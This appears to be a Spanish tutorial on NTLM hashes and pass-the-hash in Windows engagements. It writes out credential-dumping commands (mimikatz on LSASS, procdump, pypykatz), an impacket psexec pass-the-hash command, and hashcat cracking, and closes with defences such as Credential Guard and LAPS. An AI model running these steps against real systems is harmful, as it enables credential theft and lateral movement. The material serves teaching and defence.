## Por qué NTLM manda en los engagements de Windows

Windows no guarda tu contraseña: guarda `NTLM hash = MD4(UTF-16LE(
contraseña))`. Y el protocolo NTLM autentica demostrando que conoces el
hash — no la contraseña. Consecuencia práctica: quien roba el hash,
entra. La cadena típica:

```
phishing → shell como usuario → mimikatz/ProcDump de LSASS
→ hashes NTLM del usuario (y de cuentas/service en memoria)
→ pass-the-hash a otros equipos → hash de admin de dominio → game over
```

## Robar los hashes

```powershell
# Con sesión admin en el objetivo (herramientas clásicas):
mimikatz # sekurlsa::logonpasswords     # vuelca credenciales de LSASS

# Sin mimikatz (OPSEC): dump de LSASS + crack offline:
procdump -ma lsass.exe lsass.dmp
# pypykatz lsass.dmp   → hashes NTLM en tu máquina
```

## Pass-the-hash en acción

```bash
# Impacket — SMB ejecutivo con solo el hash (LM vacío : NTLM):
impacket-psexec.py -hashes :32ED87BDB5FDC5E9CBA88547376818D4 administrator@10.10.10.10

# También: wmiexec.py, atexec.py, smbexec.py (misma sintaxis -hashes)
```

El hash autentica contra SMB, WMI, WinRM... La contraseña en claro solo
la necesitas para crackear el hash OFFLINE (hashcat -m 1000) cuando
quieres reutilizarla en otros sitios (portales, VPN, correo) donde no
hay NTLM.

## La defensa moderna

- **Kerberos por defecto** en dominios sanos: los tickets no derivan de
  un hash reutilizable de la misma forma (los ataques migraron a
  kerberoasting/tickets, no a PtH).
- **Credential Guard** (VBS): aísla LSASS en un enclave virtual —
  mimikatz clásico ya no lee.
- **LAPS**: contraseñas admin locales únicas por equipo y rotadas —
  mata la reutilización que hace escalar PtH.
- **No WDigest**, lsass protected process (`RunAsPPL`), y alertas de
  "admin local usado en otro equipo".

varios de estos pasos con labs; aquí queda la teoría que los une.
